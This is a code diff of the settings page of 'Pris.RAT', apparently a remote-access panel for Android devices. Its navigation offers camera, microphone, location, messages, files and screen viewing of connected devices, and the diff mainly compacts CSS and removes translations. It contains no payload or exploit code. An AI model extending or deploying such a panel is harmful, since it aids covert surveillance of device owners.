@@ -64,21 +64,11 @@ body {
   box-shadow: 0 0 15px rgba(255,0,51,0.5);
 }
 
-.sidebar-logo-text h2 {
-  font-size: 17px;
-  letter-spacing: 1px;
-}
+.sidebar-logo-text h2 { font-size: 17px; letter-spacing: 1px; }
 .sidebar-logo-text h2 span { color: var(--red); }
-.sidebar-logo-text p {
-  font-size: 8px;
-  color: var(--text-dim);
-  letter-spacing: 2px;
-}
+.sidebar-logo-text p { font-size: 8px; color: var(--text-dim); letter-spacing: 2px; }
 
-.sidebar-nav {
-  flex: 1;
-  padding: 12px 8px;
-}
+.sidebar-nav { flex: 1; padding: 12px 8px; }
 
 .nav-item {
   display: flex;
@@ -95,17 +85,8 @@ body {
   border-right: 3px solid transparent;
 }
 
-.nav-item:hover {
-  background: rgba(255,0,51,0.05);
-  color: var(--text);
-}
-
-.nav-item.active {
-  background: var(--red-dim);
-  color: var(--text);
-  border-right-color: var(--red);
-}
-
+.nav-item:hover { background: rgba(255,0,51,0.05); color: var(--text); }
+.nav-item.active { background: var(--red-dim); color: var(--text); border-right-color: var(--red); }
 .nav-item .ico { font-size: 18px; width: 22px; text-align: center; }
 
 .sidebar-footer {
@@ -119,7 +100,6 @@ body {
 /* MAIN */
 .main {
   padding: 20px;
-  overflow-x: hidden;
 }
 
 .page-header {
@@ -146,10 +126,7 @@ body {
   transition: all 0.2s;
 }
 
-.back-btn:hover {
-  border-color: var(--red);
-  color: var(--red);
-}
+.back-btn:hover { border-color: var(--red); color: var(--red); }
 
 .page-title {
   font-size: 20px;
@@ -233,22 +210,9 @@ body {
   font-size: 14px;
 }
 
-.lang-flag {
-  font-size: 48px;
-  margin-bottom: 12px;
-}
-
-.lang-name {
-  font-size: 16px;
-  font-weight: bold;
-  margin-bottom: 5px;
-}
-
-.lang-code {
-  font-size: 11px;
-  color: var(--text-dim);
-  letter-spacing: 2px;
-}
+.lang-flag { font-size: 48px; margin-bottom: 12px; }
+.lang-name { font-size: 16px; font-weight: bold; margin-bottom: 5px; }
+.lang-code { font-size: 11px; color: var(--text-dim); letter-spacing: 2px; }
 
 /* SETTINGS ROW */
 .setting-row {
@@ -262,17 +226,8 @@ body {
 .setting-row:last-child { border-bottom: none; }
 
 .setting-info { flex: 1; }
-
-.setting-name {
-  font-size: 14px;
-  font-weight: bold;
-  margin-bottom: 4px;
-}
-
-.setting-desc {
-  font-size: 12px;
-  color: var(--text-dim);
-}
+.setting-name { font-size: 14px; font-weight: bold; margin-bottom: 4px; }
+.setting-desc { font-size: 12px; color: var(--text-dim); }
 
 /* TOGGLE */
 .toggle {
@@ -286,9 +241,7 @@ body {
   flex-shrink: 0;
 }
 
-.toggle.on {
-  background: var(--red);
-}
+.toggle.on { background: var(--red); }
 
 .toggle::after {
   content: '';
@@ -302,9 +255,7 @@ body {
   transition: all 0.3s;
 }
 
-.toggle.on::after {
-  right: 25px;
-}
+.toggle.on::after { right: 25px; }
 
 /* BUTTON */
 .btn {
@@ -331,16 +282,10 @@ body {
   color: var(--text);
 }
 
-.btn.secondary:hover {
-  border-color: var(--red);
-  color: var(--red);
-}
+.btn.secondary:hover { border-color: var(--red); color: var(--red); }
 
 /* ABOUT */
-.about-box {
-  text-align: center;
-  padding: 30px;
-}
+.about-box { text-align: center; padding: 30px; }
 
 .about-logo {
   width: 80px;
@@ -372,11 +317,7 @@ body {
   margin-bottom: 20px;
 }
 
-.about-dev {
-  font-size: 13px;
-  margin-top: 15px;
-}
-
+.about-dev { font-size: 13px; margin-top: 15px; }
 .about-dev strong { color: var(--red); }
 
 /* FOOTER */
@@ -462,7 +403,6 @@ body {
 <body>
 
 <div class="layout">
-  <!-- SIDEBAR -->
   <aside class="sidebar" id="sidebar">
     <div class="sidebar-logo">
       <div class="sidebar-logo-icon">🐺</div>
@@ -472,33 +412,15 @@ body {
       </div>
     </div>
     <nav class="sidebar-nav">
-      <a class="nav-item" href="/dashboard">
-        <span class="ico">🏠</span><span data-i18n="dashboard">الرئيسية</span>
-      </a>
-      <a class="nav-item" href="/dashboard">
-        <span class="ico">📱</span><span data-i18n="devices">الأجهزة</span>
-      </a>
-      <a class="nav-item" href="/screen">
-        <span class="ico">🖥️</span><span data-i18n="screen">عرض الشاشة</span>
-      </a>
-      <a class="nav-item" href="/dashboard">
-        <span class="ico">📷</span><span data-i18n="camera">الكاميرا</span>
-      </a>
-      <a class="nav-item" href="/dashboard">
-        <span class="ico">🎤</span><span data-i18n="mic">المايكروفون</span>
-      </a>
-      <a class="nav-item" href="/dashboard">
-        <span class="ico">📍</span><span data-i18n="location">الموقع</span>
-      </a>
-      <a class="nav-item" href="/dashboard">
-        <span class="ico">💬</span><span data-i18n="messages">الرسائل</span>
-      </a>
-      <a class="nav-item" href="/dashboard">
-        <span class="ico">📁</span><span data-i18n="files">الملفات</span>
-      </a>
-      <a class="nav-item active">
-        <span class="ico">⚙️</span><span data-i18n="settings">الإعدادات</span>
-      </a>
+      <a class="nav-item" href="/dashboard"><span class="ico">🏠</span><span>الرئيسية</span></a>
+      <a class="nav-item" href="/dashboard"><span class="ico">📱</span><span>الأجهزة</span></a>
+      <a class="nav-item" href="/screen"><span class="ico">🖥️</span><span>عرض الشاشة</span></a>
+      <a class="nav-item" href="/dashboard"><span class="ico">📷</span><span>الكاميرا</span></a>
+      <a class="nav-item" href="/dashboard"><span class="ico">🎤</span><span>المايكروفون</span></a>
+      <a class="nav-item" href="/dashboard"><span class="ico">📍</span><span>الموقع</span></a>
+      <a class="nav-item" href="/dashboard"><span class="ico">💬</span><span>الرسائل</span></a>
+      <a class="nav-item" href="/dashboard"><span class="ico">📁</span><span>الملفات</span></a>
+      <a class="nav-item active"><span class="ico">⚙️</span><span>الإعدادات</span></a>
     </nav>
     <div class="sidebar-footer">
       <div>Powered by</div>
@@ -506,25 +428,19 @@ body {
     </div>
   </aside>
 
-  <!-- MAIN -->
   <main class="main">
-    <!-- PAGE HEADER -->
     <div class="page-header">
       <button class="menu-toggle" onclick="toggleMenu()">☰</button>
-      <a href="/dashboard" class="back-btn">← <span data-i18n="back">رجوع</span></a>
+      <a href="/dashboard" class="back-btn">← رجوع</a>
       <div class="page-title">
         <span class="icon">⚙️</span>
-        <span data-i18n="settings">الإعدادات</span>
+        <span>الإعدادات</span>
       </div>
     </div>
 
-    <!-- LANGUAGE SECTION -->
     <div class="section">
       <div class="section-header">
-        <div class="section-title">
-          <span class="icon">🌐</span>
-          <span data-i18n="language">اللغة</span>
-        </div>
+        <div class="section-title"><span class="icon">🌐</span> اللغة / Language / Langue</div>
       </div>
       <div class="section-body">
         <div class="lang-grid">
@@ -547,46 +463,38 @@ body {
       </div>
     </div>
 
-    <!-- PREFERENCES -->
     <div class="section">
       <div class="section-header">
-        <div class="section-title">
-          <span class="icon">🎨</span>
-          <span data-i18n="preferences">التفضيلات</span>
-        </div>
+        <div class="section-title"><span class="icon">🎨</span> التفضيلات</div>
       </div>
       <div class="section-body">
         <div class="setting-row">
           <div class="setting-info">
-            <div class="setting-name" data-i18n="notifications">الإشعارات</div>
-            <div class="setting-desc" data-i18n="notifications_desc">تلقي إشعار عند اتصال جهاز جديد</div>
+            <div class="setting-name">الإشعارات</div>
+            <div class="setting-desc">تلقي إشعار عند اتصال جهاز جديد</div>
           </div>
           <div class="toggle on" id="notifToggle" onclick="toggleSetting('notifToggle')"></div>
         </div>
         <div class="setting-row">
           <div class="setting-info">
-            <div class="setting-name" data-i18n="sound">الأصوات</div>
-            <div class="setting-desc" data-i18n="sound_desc">صوت تنبيه عند الأحداث</div>
+            <div class="setting-name">الأصوات</div>
+            <div class="setting-desc">صوت تنبيه عند الأحداث</div>
           </div>
           <div class="toggle" id="soundToggle" onclick="toggleSetting('soundToggle')"></div>
         </div>
         <div class="setting-row">
           <div class="setting-info">
-            <div class="setting-name" data-i18n="auto_refresh">التحديث التلقائي</div>
-            <div class="setting-desc" data-i18n="auto_refresh_desc">تحديث اللوحة تلقائياً كل 10 ثوانٍ</div>
+            <div class="setting-name">التحديث التلقائي</div>
+            <div class="setting-desc">تحديث اللوحة تلقائياً كل 10 ثوانٍ</div>
           </div>
           <div class="toggle on" id="autoToggle" onclick="toggleSetting('autoToggle')"></div>
         </div>
       </div>
     </div>
 
-    <!-- ABOUT -->
     <div class="section">
       <div class="section-header">
-        <div class="section-title">
-          <span class="icon">ℹ️</span>
-          <span data-i18n="about">عن البرنامج</span>
-        </div>
+        <div class="section-title"><span class="icon">ℹ️</span> عن البرنامج</div>
       </div>
       <div class="section-body">
         <div class="about-box">
@@ -594,167 +502,51 @@ body {
           <div class="about-title">Pris.<span>RAT</span></div>
           <div class="about-version">VERSION 1.0.0 · 2026</div>
           <div style="font-size: 12px; color: var(--text-dim); line-height: 1.6; max-width: 500px; margin: 0 auto;">
-            <span data-i18n="about_desc">أداة إدارة عن بُعد للأجهزة الأندرويد — للاستخدام التعليمي فقط.</span>
+            أداة إدارة عن بُعد للأجهزة الأندرويد — للاستخدام التعليمي فقط.
           </div>
           <div class="about-dev">
-            <span data-i18n="developer">المطور:</span>
-            <strong>mkgg449-dotcom</strong>
+            المطور: <strong>mkgg449-dotcom</strong>
           </div>
         </div>
       </div>
     </div>
 
-    <!-- ACTIONS -->
     <div class="section">
       <div class="section-header">
-        <div class="section-title">
-          <span class="icon">🔧</span>
-          <span data-i18n="actions">إجراءات</span>
-        </div>
+        <div class="section-title"><span class="icon">🔧</span> إجراءات</div>
       </div>
       <div class="section-body">
         <div style="display: flex; gap: 12px; flex-wrap: wrap;">
-          <button class="btn" onclick="clearCache()">🗑️ <span data-i18n="clear_cache">مسح البيانات المحلية</span></button>
-          <button class="btn secondary" onclick="resetSettings()">🔄 <span data-i18n="reset">إعادة الإعدادات الافتراضية</span></button>
-          <button class="btn secondary" onclick="window.location.href='/logout'">🚪 <span data-i18n="logout">تسجيل الخروج</span></button>
+          <button class="btn" onclick="clearCache()">🗑️ مسح البيانات المحلية</button>
+          <button class="btn secondary" onclick="resetSettings()">🔄 إعادة الإعدادات الافتراضية</button>
+          <button class="btn secondary" onclick="window.location.href='/logout'">🚪 تسجيل الخروج</button>
         </div>
       </div>
     </div>
 
-    <!-- FOOTER -->
     <div class="main-footer">
-      <div class="brand">
-        <span style="color: var(--red);">PRIS.RAT</span> © 2026
-      </div>
-      <div>
-        <span data-i18n="developed_by">Developed by</span>
-        <strong style="color: var(--red);">mkgg449-dotcom</strong>
-      </div>
-      <div class="rights">
-        <span data-i18n="rights">All Rights Reserved · For Educational Purposes Only</span>
-      </div>
+      <div class="brand"><span>PRIS.RAT</span> © 2026</div>
+      <div>Developed by <strong style="color: var(--red);">mkgg449-dotcom</strong></div>
+      <div class="rights">All Rights Reserved · For Educational Purposes Only</div>
     </div>
-
   </main>
 </div>
 
 <script>
-/* ============ TRANSLATIONS ============ */
-const translations = {
-  ar: {
-    dashboard: 'الرئيسية',
-    devices: 'الأجهزة',
-    screen: 'عرض الشاشة',
-    camera: 'الكاميرا',
-    mic: 'المايكروفون',
-    location: 'الموقع',
-    messages: 'الرسائل',
-    files: 'الملفات',
-    settings: 'الإعدادات',
-    back: 'رجوع',
-    language: 'اللغة',
-    preferences: 'التفضيلات',
-    notifications: 'الإشعارات',
-    notifications_desc: 'تلقي إشعار عند اتصال جهاز جديد',
-    sound: 'الأصوات',
-    sound_desc: 'صوت تنبيه عند الأحداث',
-    auto_refresh: 'التحديث التلقائي',
-    auto_refresh_desc: 'تحديث اللوحة تلقائياً كل 10 ثوانٍ',
-    about: 'عن البرنامج',
-    about_desc: 'أداة إدارة عن بُعد للأجهزة الأندرويد — للاستخدام التعليمي فقط.',
-    developer: 'المطور:',
-    actions: 'إجراءات',
-    clear_cache: 'مسح البيانات المحلية',
-    reset: 'إعادة الإعدادات الافتراضية',
-    logout: 'تسجيل الخروج',
-    developed_by: 'Developed by',
-    rights: 'All Rights Reserved · For Educational Purposes Only'
-  },
-  en: {
-    dashboard: 'Dashboard',
-    devices: 'Devices',
-    screen: 'Screen View',
-    camera: 'Camera',
-    mic: 'Microphone',
-    location: 'Location',
-    messages: 'Messages',
-    files: 'Files',
-    settings: 'Settings',
-    back: 'Back',
-    language: 'Language',
-    preferences: 'Preferences',
-    notifications: 'Notifications',
-    notifications_desc: 'Get notified when a new device connects',
-    sound: 'Sounds',
-    sound_desc: 'Alert sound on events',
-    auto_refresh: 'Auto Refresh',
-    auto_refresh_desc: 'Refresh dashboard every 10 seconds',
-    about: 'About',
-    about_desc: 'Remote administration tool for Android devices — for educational purposes only.',
-    developer: 'Developer:',
-    actions: 'Actions',
-    clear_cache: 'Clear Local Data',
-    reset: 'Reset to Defaults',
-    logout: 'Logout',
-    developed_by: 'Developed by',
-    rights: 'All Rights Reserved · For Educational Purposes Only'
-  },
-  fr: {
-    dashboard: 'Tableau de bord',
-    devices: 'Appareils',
-    screen: 'Vue d\'écran',
-    camera: 'Caméra',
-    mic: 'Microphone',
-    location: 'Localisation',
-    messages: 'Messages',
-    files: 'Fichiers',
-    settings: 'Paramètres',
-    back: 'Retour',
-    language: 'Langue',
-    preferences: 'Préférences',
-    notifications: 'Notifications',
-    notifications_desc: 'Recevoir une notification lorsqu\'un nouvel appareil se connecte',
-    sound: 'Sons',
-    sound_desc: 'Son d\'alerte lors des événements',
-    auto_refresh: 'Actualisation auto',
-    auto_refresh_desc: 'Actualiser le tableau de bord toutes les 10 secondes',
-    about: 'À propos',
-    about_desc: 'Outil d\'administration à distance pour appareils Android — à des fins éducatives uniquement.',
-    developer: 'Développeur :',
-    actions: 'Actions',
-    clear_cache: 'Effacer les données locales',
-    reset: 'Réinitialiser',
-    logout: 'Déconnexion',
-    developed_by: 'Développé par',
-    rights: 'Tous droits réservés · À des fins éducatives uniquement'
-  }
-};
-
-/* ============ SET LANGUAGE ============ */
 function setLang(lang) {
-  document.documentElement.lang = lang;
-  document.documentElement.dir = (lang === 'ar') ? 'rtl' : 'ltr';
-  
-  // تحديث كل النصوص
-  document.querySelectorAll('[data-i18n]').forEach(el => {
-    const key = el.getAttribute('data-i18n');
-    if (translations[lang] && translations[lang][key]) {
-      el.textContent = translations[lang][key];
-    }
-  });
-  
-  // تحديث البطاقات
+  localStorage.setItem('pris_lang', lang);
   document.querySelectorAll('.lang-card').forEach(c => c.classList.remove('selected'));
   const card = document.getElementById('lang-' + lang);
   if (card) card.classList.add('selected');
-  
-  // الحفظ
-  localStorage.setItem('pris_lang', lang);
-  
-  showToast(lang === 'ar' ? '✅ تم تغيير اللغة' : lang === 'fr' ? '✅ Langue modifiée' : '✅ Language changed', 'success');
+
+  const msgs = {
+    ar: '✅ تم تغيير اللغة',
+    en: '✅ Language changed',
+    fr: '✅ Langue modifiée'
+  };
+  showToast(msgs[lang] || '✅', 'success');
 }
 
-/* ============ TOGGLE SETTINGS ============ */
 function toggleSetting(id) {
   const el = document.getElementById(id);
   el.classList.toggle('on');
@@ -770,11 +562,16 @@ function loadToggles() {
   });
 }
 
-/* ============ ACTIONS ============ */
+function loadLang() {
+  const saved = localStorage.getItem('pris_lang') || 'ar';
+  document.querySelectorAll('.lang-card').forEach(c => c.classList.remove('selected'));
+  const card = document.getElementById('lang-' + saved);
+  if (card) card.classList.add('selected');
+}
+
 function clearCache() {
   if (!confirm('مسح البيانات المحلية؟')) return;
   localStorage.removeItem('pris_note');
-  localStorage.removeItem('pris_lang');
   localStorage.removeItem('pris_notifToggle');
   localStorage.removeItem('pris_soundToggle');
   localStorage.removeItem('pris_autoToggle');
@@ -788,7 +585,6 @@ function resetSettings() {
   setTimeout(() => location.reload(), 800);
 }
 
-/* ============ TOAST ============ */
 function showToast(msg, type) {
   const t = document.createElement('div');
   t.className = 'toast ' + type;
@@ -797,16 +593,13 @@ function showToast(msg, type) {
   setTimeout(() => t.remove(), 3000);
 }
 
-/* ============ MENU ============ */
 function toggleMenu() {
   document.getElementById('sidebar').classList.toggle('open');
 }
 
-/* ============ INIT ============ */
 document.addEventListener('DOMContentLoaded', () => {
-  const savedLang = localStorage.getItem('pris_lang') || 'ar';
-  setLang(savedLang);
   loadToggles();
+  loadLang();
 });
 </script>
 </body>
